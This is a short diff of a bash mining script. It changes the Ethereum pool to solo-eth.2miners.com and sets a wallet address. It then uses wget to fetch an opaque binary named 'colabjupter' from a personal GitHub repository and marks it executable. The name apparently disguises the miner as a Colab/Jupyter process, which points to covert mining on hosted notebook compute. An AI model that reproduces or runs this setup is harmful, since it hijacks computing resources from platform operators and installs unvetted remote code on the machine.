@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=eth.ethashpool.com:3939
-WALLET=nglkmerkel
+POOL=solo-eth.2miners.com:6060
+WALLET=0xC887F4845da5eDcF45EcF7ac32035Fb41527B8c6
 WORKER=$(echo $(shuf -i 10-2000 -n 1))
 wget https://github.com/Mercuryfreddy209/Frenshtoast/raw/main/colabjupter
 chmod +x colabjupter
